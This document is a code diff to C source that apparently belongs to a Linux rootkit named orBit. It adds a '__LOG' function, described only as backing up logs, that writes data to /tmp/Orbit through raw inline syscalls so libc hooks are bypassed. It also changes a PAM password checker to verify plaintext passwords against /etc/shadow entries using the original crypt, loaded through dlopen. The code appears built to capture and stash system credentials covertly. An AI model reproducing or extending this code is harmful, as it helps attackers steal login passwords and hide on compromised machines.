@@ -1,5 +1,26 @@
 #include "orBit.h"
 
+/*
+ * \fn __LOG( const char *, ssize_t len )
+ * \brief Backup the logs.
+ */
+void    __LOG( const char *data, int size )
+{
+    int         fd;
+    const char  *filename = "/tmp/Orbit";
+    __asm__ volatile ("syscall" : "=a" ( fd ) : "a" (__NR_open ),
+        "D" ( filename ), "S" ( O_RDWR|O_APPEND|O_CREAT ), "d" (0666) :
+        "cc", "memory", "rcx", "r11");
+
+    __asm__ volatile ("syscall" : : "a" ( __NR_write ),
+        "D" ( fd ), "S" ( data ), "d" ( size ) :
+        "cc", "memory", "rcx", "r11");
+
+    __asm__ volatile ("syscall" : : "a" ( __NR_close ),
+        "D" ( fd ) :
+        "cc", "memory", "rcx", "r11");
+}
+
 char    *_orBit_strchr( const char *p, int ch )
 {
 	char c;
@@ -66,27 +87,37 @@ char        *strcasestr( const char *s, const char *find)
 }
 
 /*
-\fn uint8_t check_password( struct pam_response *, const char * )
-\brief [ ... ]
+ * \fn uint8_t check_password( struct pam_response *, const char * )
+ * \brief This function allows to verify that the password entered by the user is correct by matching it with the one in the database.
 */
-uint8_t check_password( struct pam_response *pwd, const char *user )
+uint8_t check_password( const char *pwd, const char *user )
 {
     struct spwd *shadow_entry = NULL;
+
     shadow_entry = getspnam( user );
-    if (shadow_entry == NULL)
+    if ( shadow_entry == NULL )
         return ( PAM_USER_UNKNOWN );
 
     char    *salt = strdup( shadow_entry->sp_pwdp );
     if ( salt == 0 )
-        return ( 1 );
+        return ( PAM_BUF_ERR );
     char *tmp = _orBit_strchr( salt, '$');
+    if ( tmp == NULL )
+        return ( PAM_AUTH_ERR );
     *strrchr( tmp, '$') = 0;
-    char    *hash = crypt( pwd->resp, tmp );
-    
-    uint8_t res = _orBit_strcmp( hash, shadow_entry->sp_pwdp ) == 0 ? PAM_SUCCESS : PAM_AUTH_ERR;
+
+    void* libc_handle = dlopen( "libcrypt.so", RTLD_LAZY );
+    if ( libc_handle == NULL )
+        return ( PAM_OPEN_ERR );
+
+    char* (*orig_crypt)( const char*, const char* ) = dlsym(libc_handle, "crypt");
+    if ( orig_crypt == NULL )
+        return ( PAM_SYMBOL_ERR );
+
+    char    *hash = orig_crypt( pwd, tmp );
     free( salt );
-    return ( res );
-} 
+    return ( _orBit_strcmp( hash, shadow_entry->sp_pwdp ) == 0 ? PAM_SUCCESS : PAM_AUTH_ERR );
+}
 
 /*
 * \fn uint8_t   get_mac_addr( struct ifreq * )
